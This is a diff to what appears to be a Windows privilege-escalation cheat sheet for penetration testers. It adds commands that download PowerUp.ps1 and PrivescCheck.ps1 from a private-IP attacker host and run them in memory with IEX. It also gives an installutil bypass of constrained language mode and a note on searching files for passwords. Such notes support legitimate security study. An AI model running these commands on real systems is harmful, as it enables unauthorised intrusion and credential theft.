@@ -41,6 +41,36 @@ powershell -ExecutionPolicy Bypass -File script.ps1
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ```
-* Contrained Langauge Bypass. Use installutil to bypass .exe restrictions. `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=false /U C:\users\Public\bypass-clm.exe`
-* Seatbelt.exe `Seatbelt.exe -group=all -full`
+# Contrained Langauge Bypass. 
+Use installutil to bypass .exe restrictions. 
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=false /U C:\users\Public\bypass-clm.exe
+```
+# Seatbelt.exe 
+```
+Seatbelt.exe -group=all -full
+```
 https://github.com/GhostPack/Seatbelt
+
+# PowerUp.ps1
+```
+(new-object system.net.webclient).downloadstring('http://192.168.49.77/PowerUp.ps1') | IEX
+```
+```
+Invoke-AllChecks
+```
+# Enumerate Files For Passwords
+- .txt
+- .ps1
+- config (not just .config but any file that has to do with the application/service it is running)
+
+# WinPeas.exe
+
+# PrivEscCheck
+```
+(new-object system.net.webclient).downloadstring('http://192.168.45.233/PrivescCheck.ps1') | IEX
+```
+```
+Invoke-PrivescCheck -Extended
+```
+
